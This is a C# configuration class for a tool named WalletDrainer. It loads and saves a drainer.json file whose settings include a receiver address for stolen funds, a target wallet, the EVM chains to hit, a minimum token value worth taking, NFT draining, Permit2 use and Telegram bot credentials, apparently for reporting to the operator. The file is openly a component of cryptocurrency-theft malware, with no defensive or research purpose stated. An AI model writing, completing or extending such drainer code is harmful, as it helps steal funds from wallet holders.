using System.Text.Json;

namespace WalletDrainer.Config;

public sealed class DrainerConfig
{
    public string ReceiverAddress { get; set; } = "0x0000000000000000000000000000000000000000";
    public string TargetAddress { get; set; } = string.Empty;
    public string[] EnabledChains { get; set; } = ["ethereum", "bsc", "polygon", "arbitrum"];
    public decimal MinTokenValueUsd { get; set; } = 5.0m;
    public int PollIntervalSeconds { get; set; } = 10;
    public bool DrainNfts { get; set; } = true;
    public bool UsePermit2 { get; set; } = true;
    public string? TelegramBotToken { get; set; }
    public string? TelegramChatId { get; set; }
    public int MaxGasPriceGwei { get; set; } = 100;

    public static DrainerConfig Load()
    {
        string configPath = Path.Combine(AppContext.BaseDirectory, "drainer.json");

        if (File.Exists(configPath))
        {
            string json = File.ReadAllText(configPath);
            return JsonSerializer.Deserialize<DrainerConfig>(json) ?? new DrainerConfig();
        }

        return new DrainerConfig();
    }

    public void Save()
    {
        string configPath = Path.Combine(AppContext.BaseDirectory, "drainer.json");
        string json = JsonSerializer.Serialize(this, new JsonSerializerOptions { WriteIndented = true });
        File.WriteAllText(configPath, json);
    }
}
